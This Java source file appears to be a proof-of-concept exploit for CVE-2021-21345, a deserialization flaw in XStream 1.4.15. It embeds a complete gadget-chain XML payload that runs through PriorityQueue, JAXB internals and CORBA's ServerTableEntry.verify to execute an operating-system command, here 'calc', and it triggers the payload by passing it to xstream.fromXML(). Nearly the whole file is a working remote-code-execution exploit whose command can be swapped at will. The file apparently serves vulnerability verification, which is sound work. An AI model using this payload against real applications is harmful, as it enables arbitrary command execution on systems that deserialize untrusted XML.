package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21345 {
    public static void main(String[] args) {

        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                "                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\n" +
                "                      <uriProperties/>\n" +
                "                      <attributeProperties/>\n" +
                "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                "                        <getter>\n" +
                "                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\n" +
                "                          <name>verify</name>\n" +
                "                          <parameter-types/>\n" +
                "                        </getter>\n" +
                "                      </inheritedAttWildcard>\n" +
                "                    </bi>\n" +
                "                    <tagName/>\n" +
                "                    <context>\n" +
                "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                "                        <outer-class reference='../..'/>\n" +
                "                      </marshallerPool>\n" +
                "                      <nameList>\n" +
                "                        <nsUriCannotBeDefaulted>\n" +
                "                          <boolean>true</boolean>\n" +
                "                        </nsUriCannotBeDefaulted>\n" +
                "                        <namespaceURIs>\n" +
                "                          <string>1</string>\n" +
                "                        </namespaceURIs>\n" +
                "                        <localNames>\n" +
                "                          <string>UTF-8</string>\n" +
                "                        </localNames>\n" +
                "                      </nameList>\n" +
                "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n" +
                "                  <activationCmd>calc</activationCmd>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}